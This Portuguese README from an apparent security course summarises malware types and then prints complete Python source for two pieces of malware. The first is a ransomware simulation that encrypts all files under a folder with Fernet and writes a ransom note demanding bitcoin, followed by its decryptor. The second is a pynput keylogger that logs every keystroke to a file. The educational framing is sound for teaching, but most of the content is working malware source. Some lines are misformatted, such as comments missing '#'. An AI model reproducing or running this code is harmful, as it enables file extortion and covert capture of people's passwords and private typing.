# Material desenvolvido como parte de um curso de Segurança da Informação

Este repositório reúne scripts estudados em um curso introdutório de Segurança da Informação, com foco em compreender — na prática — como algumas ameaças funcionam.
O objetivo não é ofensivo, mas sim educacional:
-A ética é o que diferencia um criminoso de um profissional da área.

#A seguir, um resumo dos principais tipos de malware estudados:*

-Vírus: Anexa-se a programas legítimos e se replica quando esses programas são executados.
-Worms: Propagam-se automaticamente pela rede explorando vulnerabilidades.
-Ransomware: Criptografa arquivos e exige pagamento para liberar os dados.
-Spyware: Coleta informações do usuário sem autorização.
-Trojan (Cavalo de Troia): Parece útil, mas instala código malicioso.
-Keylogger: Registra tudo o que é digitado.

# Uma ameaça simples pode causar um impacto gigantesco.

# Parte 1 — Criptografia e Descriptografia (Fernet)

O projeto inclui scripts que simulam o funcionamento básico de um ransomware, criptografando e depois restaurando arquivos usando o módulo cryptography (Fernet).

🖥️ Scrip Criptografia:

`from cryptography.fernet import Fernet
import os'

 1 Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

 2 Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

 3 Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

 4 Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

 5 Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Your files have been hijacked from your machine.\n")
        f.write("To recover it, you need to send 1 bitcoin to account X and send proof of payment.\n")
        f.write("After that, we will send you the key to recover your data.")

6 Execução principal:
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware running! Encrypted file.")

if __name__ == "__main__":
    main()


# 🖥️ Scrip Descriptografia

from cryptography.fernet import Fernet
import os

def carregar_chave():
  return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
  f = Fernet(chave)
  with open(arquivo, "rb") as file:
    dados = file.read()
    dados_descriptografados = f.decrypt(dados)
  with open(arquivo, "wb") as file:
    file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
  chave = carregar_chave()
  arquivos = encontrar_arquivos("test_files")
  for arquivo in arquivos:
    descriptografar_arquivo(arquivo, chave)
  print("Files restored successfully.")  

if __name__ == "__main__":
  main()

_________________________________________________________________________________________________________________________________________________

# O que o script faz:
  Gera uma chave e salva em chave.key
  Criptografa arquivos dentro da pasta indicada
  Descriptografa os mesmos arquivos usando a chave
  Demonstra, na prática, a importância do controle de acesso a chaves

# Comando para descriptografar:
python3 descriptografar.py
Os arquivos restaurados (dados_confidenciais e senhas) voltam ao estado original.


# Parte 2 — Keylogger (Estudo Prático)

Durante o curso, também foi construído um keylogger simples, apenas para fins de compreensão.

# Conceitos estudados:
-O script roda em segundo plano
-Escuta o teclado continuamente
-Registra cada tecla pressionada em log.txt
-Determinadas teclas são ignoradas (Shift, Ctrl, Alt etc.)

Precisa instalar a biblioteca: pip install pynput

🖥️ Script Keylogger
from pynput import keyboard

Teclas que não devem ser registradas:
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

Função chamada sempre que uma tecla é pressionada:
def on_press(key):
    try:
        # Teclas normais (letras, números, símbolos)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Tratamento de teclas especiais
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

Iniciar o listener:
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
_________________________________________________________________________________________________________________________________________________

# OBSERVAÇÃO: Este repositório existe exclusivamente para estudo e capacitação profissional.
